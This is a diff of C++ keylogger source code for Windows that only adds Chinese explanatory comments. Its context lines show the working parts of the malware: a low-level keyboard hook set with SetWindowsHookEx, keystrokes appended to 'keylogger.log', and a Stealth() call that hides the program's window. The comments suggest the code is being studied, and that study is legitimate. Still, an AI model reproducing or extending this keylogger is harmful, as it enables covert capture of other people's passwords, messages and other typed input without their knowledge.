@@ -62,7 +62,7 @@ std::ofstream output_file;
 
 // This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
-LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) // hook的回调函数
 {
 	if (nCode >= 0)
 	{
@@ -87,7 +87,7 @@ void SetHook()
 	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
 	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
 	// function that sets and releases the hook.
-	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) // 使用该hook函数，实现hook
 	{
 		LPCWSTR a = L"Failed to install hook!";
 		LPCWSTR b = L"Error";
@@ -200,7 +200,7 @@ int main()
 	const char* output_filename = "keylogger.log";
 	std::cout << "Logging output to " << output_filename << std::endl;
 	output_file.open(output_filename, std::ios_base::app);
-
+	// 打开log文件 std::ofstream output_file; 用这个定义了一个全局变量，在外头
 	// visibility of window
 	Stealth();
 
